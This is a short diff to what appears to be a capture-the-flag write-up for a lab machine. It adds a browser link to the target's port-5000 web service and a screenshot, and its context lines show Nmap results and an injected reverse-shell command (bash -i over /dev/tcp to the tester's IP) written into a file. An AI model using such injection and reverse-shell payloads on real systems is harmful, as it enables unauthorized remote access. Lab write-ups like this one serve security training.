@@ -43,6 +43,9 @@ Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
 
 We can see that the ports 5000 and 22 are open, 5000 for http and 22 for ssh
 
+Open the following link in the browser : http://10.10.10.226:5000
+![alt text](https://miro.medium.com/max/1050/1*kHKLfZcara8e5gh-YGbe1Q.png)
+
 ```
 echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.76/1234 0>&1' #" >> hackers
 ```
